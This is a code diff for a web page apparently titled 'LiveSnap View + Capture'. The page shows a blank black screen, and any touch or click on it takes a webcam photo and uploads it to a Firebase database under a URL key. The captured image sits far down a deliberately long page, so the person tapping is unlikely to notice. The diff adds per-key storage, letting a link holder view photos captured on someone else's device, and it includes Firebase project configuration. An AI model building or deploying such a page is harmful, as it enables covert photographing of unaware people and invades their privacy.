@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - Touch Only</title>
+  <title>LiveSnap View + Capture</title>
   <style>
     body {
       background: black;
@@ -10,19 +10,19 @@
       padding: 0;
       font-family: sans-serif;
       overflow-y: scroll;
-      min-height: 300vh; /* Full page scroll */
+      min-height: 300vh;
+      color: white;
     }
     #captureArea {
       height: 100vh;
       width: 100vw;
     }
     #spacer {
-      height: 150vh; /* Zyada scroll karna pade */
+      height: 150vh;
     }
     #result {
       text-align: center;
       padding: 20px;
-      color: white;
     }
     #livePhoto {
       width: 90%;
@@ -34,8 +34,7 @@
 </head>
 <body>
   <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
-
-  <div id="spacer"></div> <!-- Spacer for long scroll -->
+  <div id="spacer"></div>
 
   <div id="result">
     <h3>Captured Photo:</h3>
@@ -58,13 +57,20 @@
       appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
       measurementId: "G-BR9MFH2XN6"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+
+    const params = new URLSearchParams(window.location.search);
+    const key = params.get("key");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const img = document.getElementById('livePhoto');
+
+    if (!key) {
+      document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>No key provided in URL (use ?key=yourkey)</h2>";
+      throw new Error("Key not provided");
+    }
 
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
@@ -77,16 +83,13 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      db.ref("livephoto").set({
+      db.ref("livephoto/" + key).set({
         image: dataUrl,
         time: Date.now()
       });
-
-      // NO auto scroll anymore
-      // document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
     }
 
-    db.ref("livephoto").on("value", snapshot => {
+    db.ref("livephoto/" + key).on("value", snapshot => {
       const data = snapshot.val();
       if (data && data.image) {
         img.src = data.image;
